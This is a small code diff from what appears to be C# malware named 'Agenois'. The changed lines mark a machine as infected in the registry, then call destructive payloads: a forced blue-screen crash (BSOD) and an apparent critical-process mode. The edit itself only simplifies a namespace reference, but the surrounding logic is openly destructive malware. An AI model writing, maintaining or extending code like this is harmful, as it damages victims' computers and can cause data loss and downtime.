@@ -190,12 +190,11 @@ namespace Agenois
                 editKey.SetValue("AgenoisInfected", "1");
                 editKey.Close();
 
-                Agenois.Payloads.Destructive.BSOD();
+                Destructive.BSOD();
             }
             else
             {
                 Destructive.EnableCriticalMode();
-                
             }
         }
 
